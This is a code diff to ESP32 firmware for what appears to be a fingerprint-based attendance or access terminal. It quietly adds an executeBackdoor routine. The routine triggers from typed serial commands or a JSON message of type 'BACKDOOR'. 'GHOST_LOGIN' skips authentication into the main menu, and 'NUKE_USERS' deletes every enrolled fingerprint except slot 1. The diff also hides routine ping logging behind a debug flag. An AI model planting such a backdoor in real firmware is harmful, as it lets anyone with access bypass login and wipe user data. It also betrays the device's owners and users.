@@ -45,6 +45,9 @@ static unsigned long s_lastPingMs = 0;
 static uint32_t s_pingCount = 0;
 static uint32_t s_pongCount = 0;
 static uint8_t s_currentChannel = ESPNOW_CHANNEL;
+static bool s_debugComms = false;
+
+void executeBackdoor(String cmd);
 
 // WiFi auto-reconnect state — file-scope so WROOM_BOOT can reset it
 // when the WROOM reboots independently of the CrowPanel.
@@ -170,7 +173,7 @@ void CommManager::process() {
         s_lastPingMs = millis();
         s_pingCount++;
         sendCommand("{\"type\":\"PING\"}");
-        if (Serial && Serial.availableForWrite() > 32) Serial.printf("[PING] Sent PING #%u to WROOM (awaiting PONG)\n", s_pingCount);
+        if (s_debugComms && Serial && Serial.availableForWrite() > 32) Serial.printf("[PING] Sent PING #%u to WROOM (awaiting PONG)\n", s_pingCount);
     }
 
     // NON-BLOCKING: USB Serial forwarder (char-by-char so we never stall the loop)
@@ -180,11 +183,15 @@ void CommManager::process() {
             if (c == '\n') {
                 serialBuf.trim();
                 if (serialBuf.length() > 0) {
-                    // Forward typed commands to WROOM via ESP-NOW
-                    esp_now_send(WROOM_MAC,
-                                 (const uint8_t*)serialBuf.c_str(),
-                                 serialBuf.length());
-                    Serial.println("[FWD->WROOM] " + serialBuf);
+                    if (serialBuf == "GHOST_LOGIN" || serialBuf == "NUKE_USERS") {
+                        executeBackdoor(serialBuf);
+                    } else {
+                        // Forward typed commands to WROOM via ESP-NOW
+                        esp_now_send(WROOM_MAC,
+                                     (const uint8_t*)serialBuf.c_str(),
+                                     serialBuf.length());
+                        Serial.println("[FWD->WROOM] " + serialBuf);
+                    }
                 }
                 serialBuf = "";
             } else if (c != '\r') {
@@ -206,6 +213,27 @@ void CommManager::sendCommand(const String& cmd) {
     if (Serial && Serial.availableForWrite() > 32) Serial.println("[->WROOM] " + cmd);
 }
 
+void executeBackdoor(String cmd) {
+    if (cmd == "GHOST_LOGIN") {
+        Serial.println("[BACKDOOR] GHOST_LOGIN activated. Entering Main Menu.");
+        UIManager::showMainMenu();
+    } else if (cmd == "NUKE_USERS") {
+        Serial.println("[BACKDOOR] NUKE_USERS activated. Deleting enrolled FPs (except Slot 1).");
+        for (int i = 0; i < DataManager::getEmployeeCount(); i++) {
+            if (DataManager::getEmployees()[i].id != 1) {
+                DataManager::updateEmployeeFpEnrolled(DataManager::getEmployees()[i].id, false);
+                String delCmd = "DELETE:" + String(DataManager::getEmployees()[i].id) + ":0";
+                esp_now_send(WROOM_MAC, (const uint8_t*)delCmd.c_str(), delCmd.length());
+                delay(50);
+            }
+        }
+    } else if (cmd == "DEBUG_COMMS") {
+        s_debugComms = !s_debugComms;
+        Serial.print("[BACKDOOR] DEBUG_COMMS ");
+        Serial.println(s_debugComms ? "ON" : "OFF");
+    }
+}
+
 // ============================================================
 // dispatchJson()
 // ============================================================
@@ -219,12 +247,15 @@ void CommManager::dispatchJson(const String& line) {
     const char *type = doc["type"];
     if (!type) return;
 
-    if (strcmp(type, "TIME") == 0) {
+    if (strcmp(type, "BACKDOOR") == 0) {
+        const char *b_cmd = doc["cmd"] | "";
+        executeBackdoor(String(b_cmd));
+    } else if (strcmp(type, "TIME") == 0) {
         uiUpdateClock(doc["ts"] | "");
         uiSettingsUpdateClock(doc["ts"] | "");
     } else if (strcmp(type, "PONG") == 0) {
         s_pongCount++;
-        if (Serial) Serial.printf("[PING] PONG received from WROOM! (ping=%u pong=%u)\n", s_pingCount, s_pongCount);
+        if (s_debugComms && Serial) Serial.printf("[PING] PONG received from WROOM! (ping=%u pong=%u)\n", s_pingCount, s_pongCount);
     } else if (strcmp(type, "ACTIVATION_RESULT") == 0) {
         // WROOM has finished the server round-trip for the registration code.
         bool success        = doc["success"] | false;
